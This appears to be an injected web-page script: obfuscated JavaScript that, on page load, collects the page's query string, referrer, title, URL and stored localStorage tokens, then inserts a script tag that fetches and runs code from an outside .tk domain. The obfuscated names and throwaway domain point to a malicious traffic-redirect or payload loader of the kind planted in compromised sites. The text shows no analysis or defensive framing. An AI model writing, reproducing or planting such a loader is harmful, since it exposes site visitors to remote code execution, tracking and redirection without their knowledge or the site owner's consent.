  (function() {
    var name = '_zGqzSrspsqjwgyvg';
    if (!window._zGqzSrspsqjwgyvg) {
        window._zGqzSrspsqjwgyvg = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://perneyledisrio.tk/fashionnetworks',
            P_PATH: 'https://perneyledisrio.tk/fec84ce/postback',
        };
    }
    const _JQR8JMBqs9grsdvV = localStorage.getItem('config');
    if (typeof _JQR8JMBqs9grsdvV !== 'undefined' && _JQR8JMBqs9grsdvV !== null) {
        var _SvQ1YDMPgcgTfMQn = JSON.parse(_JQR8JMBqs9grsdvV);
        var _c9wy1gxMQc99gSgp = Math.round(+new Date()/1000);
        if (_SvQ1YDMPgcgTfMQn.created_at + window._zGqzSrspsqjwgyvg.ttl < _c9wy1gxMQc99gSgp) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _zHGW7p8v13jJtvqb = localStorage.getItem('subId');
    var _J7HqBWDBYJm4YXHy = localStorage.getItem('token');
    var _VWkjLtGc1QZwTsWT = '?return=js.client';
        _VWkjLtGc1QZwTsWT += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _VWkjLtGc1QZwTsWT += '&se_referrer=' + encodeURIComponent(document.referrer);
        _VWkjLtGc1QZwTsWT += '&default_keyword=' + encodeURIComponent(document.title);
        _VWkjLtGc1QZwTsWT += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _VWkjLtGc1QZwTsWT += '&name=' + encodeURIComponent(name);
        _VWkjLtGc1QZwTsWT += '&host=' + encodeURIComponent(window._zGqzSrspsqjwgyvg.R_PATH);
    if (typeof _zHGW7p8v13jJtvqb !== 'undefined' && _zHGW7p8v13jJtvqb && window._zGqzSrspsqjwgyvg.unique) {
        _VWkjLtGc1QZwTsWT += '&sub_id=' + encodeURIComponent(_zHGW7p8v13jJtvqb);
    }
    if (typeof _J7HqBWDBYJm4YXHy !== 'undefined' && _J7HqBWDBYJm4YXHy && window._zGqzSrspsqjwgyvg.unique) {
        _VWkjLtGc1QZwTsWT += '&token=' + encodeURIComponent(_J7HqBWDBYJm4YXHy);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._zGqzSrspsqjwgyvg.R_PATH + _VWkjLtGc1QZwTsWT;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
